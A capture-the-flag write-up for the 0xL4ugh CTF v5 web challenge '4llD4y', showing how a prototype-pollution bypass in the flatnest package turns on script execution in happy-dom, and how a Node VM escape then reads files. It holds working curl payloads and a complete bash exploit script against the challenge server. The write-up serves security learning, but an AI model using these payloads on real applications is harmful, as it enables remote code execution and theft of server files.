---
title: "4llD4y - 0xL4ugh CTF v5"
category: "web"
subcategory: "prototype-pollution"
type: "writeup"
tags: ["web", "happy-dom", "prototype-pollution", "vm-escape", "exec", "nodejs", "0xl4ugh-ctf", "0xl4ugh-ctf-v5", "ctf-writeup"]
summary: "The challenge is a Node.js Express application with two endpoints:"
source:
  name: "CTFtime writeup #40540"
  url: "https://ctftime.org/writeup/40540"
original_source: "https://raqton.vercel.app/blog/4llD4y"
ctf:
  name: "0xL4ugh CTF v5"
  challenge: "4llD4y"
---

## Metadata

- **CTF:** 0xL4ugh CTF v5
- **Task:** 4llD4y
- **Author team:** CP_Z3R0
- **CTFtime tags:** happy-dom, prototype_pollution, vm_escape
- **CTFtime:** <https://ctftime.org/writeup/40540>
- **Original writeup:** <https://raqton.vercel.app/blog/4llD4y>

---
[__BACK TO BLOG](https://raqton.vercel.app/blog)

![4llDay writeup](https://raw.githubusercontent.com/LawKmu/blogs/refs/heads/master/images/4llDay.png)

# 4llD4y CTF Challenge Writeup

## Challenge Overview

  * **Category:** Web Exploitation
  * **Vulnerability:** Prototype Pollution → RCE via happy-dom VM Escape
  * **Flag:** `0xL4ugh{H4appy_D0m_4ll_th3_D4y_b240757b5672fc10}`


## Challenge Analysis

### Application Structure

The challenge is a Node.js Express application with two endpoints:

```
    // POST /config - Processes configuration using flatnest
    app.post('/config', (req, res) => {
      const incoming = req.body
      nest(incoming)  // Result is discarded!
      res.json({ message: 'configuration applied' })
    })
    
    // POST /render - Renders HTML using happy-dom
    app.post('/render', (req, res) => {
      const { html } = req.body
      const window = new Window({ console })
      window.document.write(html)
      res.send(window.document.documentElement.outerHTML)
    })
```

### Key Dependencies

  * **flatnest v1.0.1** \- Converts flat key-value pairs to nested objects
  * **happy-dom v20.3.1** \- Server-side DOM implementation with JavaScript evaluation capabilities


### Flag Location

The flag is stored at `/flag_<random-8-hex-bytes>.txt` (e.g., `/flag_eb6c3156a5673fb0.txt`)

* * *

## Vulnerability Analysis

### Step 1: Identifying the Attack Vector

The goal is to execute JavaScript in happy-dom to read the flag file. By default, happy-dom has `enableJavaScriptEvaluation: false`, so `<script>` tags are not executed.

Looking at the Window constructor:

```
    const window = new Window({ console })  // No settings parameter!
```

If we could pollute `Object.prototype.settings`, the Window would inherit our malicious settings.

### Step 2: Analyzing flatnest's Protections

The `nest()` function in flatnest has protections against prototype pollution:

```
    function insert(target, path, value) {
      // ...
      for (var i = 0; i < len; i += 2) {
        var key = pathBits[i]
        if (key === "__proto__") continue  // Blocked!
        if (key === "constructor" && typeof target[key] == "function") continue  // Blocked!
        // ...
      }
    }
```

Direct payloads like `{"__proto__.polluted": "yes"}` or `{"constructor.prototype.polluted": "yes"}` are blocked.

### Step 3: Discovering the Bypass - Circular References

flatnest has a circular reference feature that uses a separate `seek()` function:

```
    // In nest():
    if (typeof obj[key] == "string" && circular.test(obj[key])) {
      var ref = circular.exec(obj[key])[1]
      obj[key] = seek(nested, ref)  // seek() has NO protections!
    }
    
    // seek.js - NO __proto__ or constructor checks!
    function seek(obj, path) {
      var pathBits = path.split(nestedRe)
      var layer = obj
      for (var i = 0; i < len; i += 2) {
        var key = pathBits[i]
        layer = layer[key]  // Direct property access!
      }
      return layer
    }
```

**The bypass:** Use `[Circular (constructor.prototype)]` to get a reference to `Object.prototype`, then write properties into it!

* * *

## Exploitation

### Step 1: Prototype Pollution

Pollute `Object.prototype.settings.enableJavaScriptEvaluation`:

```
    curl -s http://challenges3.ctf.sd:33663/config \
      -H "Content-Type: application/json" \
      -d '{
        "ref": "[Circular (constructor.prototype)]",
        "ref.settings.enableJavaScriptEvaluation": true
      }'
```

**How it works:**

  1. `"ref": "[Circular (constructor.prototype)]"` → `seek(nested, "constructor.prototype")` returns `Object.prototype`
  2. `nested.ref` is now set to `Object.prototype`
  3. `"ref.settings.enableJavaScriptEvaluation": true` → Writes to `nested.ref.settings.enableJavaScriptEvaluation`
  4. Since `nested.ref === Object.prototype`, this pollutes `Object.prototype.settings`!


### Step 2: Verify JavaScript Execution

```
    curl -s http://challenges3.ctf.sd:33663/render \
      -H "Content-Type: application/json" \
      -d '{"html": "<script>document.body.innerHTML = \"JS_WORKS\";</script><body></body>"}'
```

Response: `<html><head></head><body>JS_WORKS</body></html>`

### Step 3: VM Escape to RCE

happy-dom uses Node's VM context for JavaScript evaluation, which is escapable:

```
    // Classic VM escape
    const proc = this.constructor.constructor("return process")();
    const fs = proc.getBuiltinModule("fs");
```

### Step 4: Find and Read the Flag

**List flag files:**

```
    curl -s http://challenges3.ctf.sd:33663/render \
      -H "Content-Type: application/json" \
      -d '{"html": "<script>const proc = this.constructor.constructor(\"return process\")(); const fs = proc.getBuiltinModule(\"fs\"); const files = fs.readdirSync(\"/\").filter(f => f.startsWith(\"flag\")); document.body.innerHTML = files.join(\",\");</script><body></body>"}'
```

Response: `flag_eb6c3156a5673fb0.txt`

**Read the flag:**

```
    curl -s http://challenges3.ctf.sd:33663/render \
      -H "Content-Type: application/json" \
      -d '{"html": "<script>const proc = this.constructor.constructor(\"return process\")(); const fs = proc.getBuiltinModule(\"fs\"); const flag = fs.readFileSync(\"/flag_eb6c3156a5673fb0.txt\", \"utf8\"); document.body.innerHTML = flag;</script><body></body>"}'
```

* * *

## Complete Exploit Script

```
    #!/bin/bash
    TARGET="http://challenges3.ctf.sd:33663"
    
    # Step 1: Prototype pollution to enable JavaScript evaluation
    curl -s "$TARGET/config" \
      -H "Content-Type: application/json" \
      -d '{"ref": "[Circular (constructor.prototype)]", "ref.settings.enableJavaScriptEvaluation": true}'
    
    # Step 2: Find flag file and read it
    curl -s "$TARGET/render" \
      -H "Content-Type: application/json" \
      -d '{"html": "<script>const proc = this.constructor.constructor(\"return process\")(); const fs = proc.getBuiltinModule(\"fs\"); const files = fs.readdirSync(\"/\").filter(f => f.startsWith(\"flag\")); const flag = fs.readFileSync(\"/\" + files[0], \"utf8\"); document.body.innerHTML = flag;</script><body></body>"}'
```

* * *

## Key Takeaways

  1. **Incomplete Sanitization:** flatnest blocked `__proto__` and `constructor` in the main `insert()` function but forgot to protect the `seek()` function used for circular references.

  2. **Prototype Pollution Chain:** By storing a reference to `Object.prototype` in a property, subsequent writes to that property's sub-paths pollute the prototype.

  3. **Settings Inheritance:** happy-dom's Window constructor reads settings from the options object, which inherits from `Object.prototype` if not explicitly set.

  4. **VM Context Escape:** Node.js VM contexts are not true sandboxes. The classic `this.constructor.constructor("return process")()` escape provides full access to the Node.js runtime.


* * *

## References

  * [flatnest npm package](https://www.npmjs.com/package/flatnest)
  * [happy-dom GitHub](https://github.com/capricorn86/happy-dom)
  * [Prototype Pollution Attacks](https://portswigger.net/web-security/prototype-pollution)
  * [Node.js VM Escape Techniques](https://blog.netspi.com/escape-nodejs-sandboxes/)


Written by

Mouad Ait El Aouad

### Comments

Join the discussion! Sign in with GitHub to leave a comment.
